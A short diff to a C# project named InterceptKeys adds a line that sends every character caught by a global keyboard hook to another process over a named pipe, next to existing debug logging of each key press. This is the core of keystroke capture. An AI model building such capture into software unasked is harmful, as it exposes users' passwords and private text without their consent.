@@ -26,6 +26,7 @@ namespace InterceptKeys
                 m_KeyboardHookManager.Enabled = true;
                 m_KeyboardHookManager.KeyPress += (sender, e) =>
                 {
+                    NamedPipe.Sender.SendMessage(new List<string>(){e.KeyChar.ToString()});
                     logger.Debug(string.Format("KeyDown \t\t {0}\n", e.KeyChar));
                 };
                 Application.Run();
